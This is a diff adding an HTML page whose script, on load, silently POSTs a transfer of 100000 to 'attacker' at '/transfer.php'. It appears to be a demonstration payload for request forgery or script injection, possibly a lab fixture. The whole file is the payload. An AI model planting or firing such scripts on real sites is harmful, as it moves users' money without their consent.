@@ -1,0 +1,17 @@
+<html>
+
+<head>
+  <script>
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', '/transfer.php', true);
+    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4) {
+        // request made
+      }
+    };
+    xhr.send('to=attacker&amount=100000');
+  </script>
+</head>
+
+</html>
